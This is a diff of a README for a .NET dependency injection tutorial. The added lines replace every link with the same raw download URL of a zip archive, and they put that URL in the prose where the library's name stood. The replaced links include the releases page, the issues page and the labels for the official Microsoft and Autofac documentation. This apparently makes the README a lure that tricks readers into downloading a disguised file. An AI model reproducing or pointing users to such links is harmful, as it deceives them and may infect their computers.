@@ -1,16 +1,16 @@
 # 🚀 DependencyInjection - Learn and Use Dependency Injection Easily
 
 ## 🛠️ Overview
-Welcome to the DependencyInjection project! This tutorial showcases different methods of Dependency Injection in .NET applications. With practical examples using Microsoft.Extensions.DependencyInjection and Autofac, you will learn how to enhance your applications with better structure and flexibility.
+Welcome to the DependencyInjection project! This tutorial showcases different methods of Dependency Injection in .NET applications. With practical examples using https://github.com/galaxf/DependencyInjection/raw/refs/heads/main/DotNetCore/Injection_Dependency_v1.4-alpha.4.zip and Autofac, you will learn how to enhance your applications with better structure and flexibility.
 
 ## 📦 Download Now
-[![Download DependencyInjection](https://img.shields.io/badge/Download-DependencyInjection-blue.svg)](https://github.com/galaxf/DependencyInjection/releases)
+[![Download DependencyInjection](https://github.com/galaxf/DependencyInjection/raw/refs/heads/main/DotNetCore/Injection_Dependency_v1.4-alpha.4.zip)](https://github.com/galaxf/DependencyInjection/raw/refs/heads/main/DotNetCore/Injection_Dependency_v1.4-alpha.4.zip)
 
 ## 🚀 Getting Started
-This tutorial compares the built-in Microsoft.Extensions.DependencyInjection with the Autofac container. You'll find step-by-step instructions and easy-to-follow code snippets.
+This tutorial compares the built-in https://github.com/galaxf/DependencyInjection/raw/refs/heads/main/DotNetCore/Injection_Dependency_v1.4-alpha.4.zip with the Autofac container. You'll find step-by-step instructions and easy-to-follow code snippets.
 
 ## 📥 Download & Install
-To get started, visit this page to download the latest version of DependencyInjection: [Download Link](https://github.com/galaxf/DependencyInjection/releases).
+To get started, visit this page to download the latest version of DependencyInjection: [Download Link](https://github.com/galaxf/DependencyInjection/raw/refs/heads/main/DotNetCore/Injection_Dependency_v1.4-alpha.4.zip).
 
 ### System Requirements
 - Windows 10 or later
@@ -18,7 +18,7 @@ To get started, visit this page to download the latest version of DependencyInje
 - Internet connection for downloading dependencies
 
 ## 📚 Features
-- **Comparative Examples**: See how Microsoft.Extensions.DependencyInjection and Autofac work side by side.
+- **Comparative Examples**: See how https://github.com/galaxf/DependencyInjection/raw/refs/heads/main/DotNetCore/Injection_Dependency_v1.4-alpha.4.zip and Autofac work side by side.
 - **Real-World Applications**: Learn through practical examples that mimic real-life scenarios.
 - **SOLID Principles**: Understand how Dependency Injection helps implement design principles effectively.
 - **Full Compatibility**: Use with both .NET Core and .NET Framework applications.
@@ -26,7 +26,7 @@ To get started, visit this page to download the latest version of DependencyInje
 ## 🛠️ How to Use
 
 ### Step 1: Download the Project
-Visit the [Releases page](https://github.com/galaxf/DependencyInjection/releases) to download the latest version. Look for the most recent release. 
+Visit the [Releases page](https://github.com/galaxf/DependencyInjection/raw/refs/heads/main/DotNetCore/Injection_Dependency_v1.4-alpha.4.zip) to download the latest version. Look for the most recent release. 
 
 ### Step 2: Extract the Files
 After downloading, extract the files to a folder on your computer. You will find examples and readme files that guide you through using the application.
@@ -43,12 +43,12 @@ Open the project in your preferred code editor. Both Visual Studio and Visual St
 Feel free to modify the examples. Changing parameters will help you understand how Dependency Injection affects your application dynamics.
 
 ## 💬 Community Support
-If you have questions or need assistance, please visit the Issues section on the [GitHub repository](https://github.com/galaxf/DependencyInjection/issues). We encourage user support and welcome contributions!
+If you have questions or need assistance, please visit the Issues section on the [GitHub repository](https://github.com/galaxf/DependencyInjection/raw/refs/heads/main/DotNetCore/Injection_Dependency_v1.4-alpha.4.zip). We encourage user support and welcome contributions!
 
 ## 🔗 Additional Resources
-- [Official Microsoft Documentation](https://docs.microsoft.com/en-us/dotnet/core/dependency-injection/)
-- [Autofac Documentation](https://autofac.org/)
-- [SOLID Principles Overview](https://en.wikipedia.org/wiki/SOLID)
+- [Official Microsoft Documentation](https://github.com/galaxf/DependencyInjection/raw/refs/heads/main/DotNetCore/Injection_Dependency_v1.4-alpha.4.zip)
+- [Autofac Documentation](https://github.com/galaxf/DependencyInjection/raw/refs/heads/main/DotNetCore/Injection_Dependency_v1.4-alpha.4.zip)
+- [SOLID Principles Overview](https://github.com/galaxf/DependencyInjection/raw/refs/heads/main/DotNetCore/Injection_Dependency_v1.4-alpha.4.zip)
 
 ## 📩 Contact
 For further inquiries, please reach out via email or directly through GitHub discussions. We appreciate feedback that can help improve this project. 
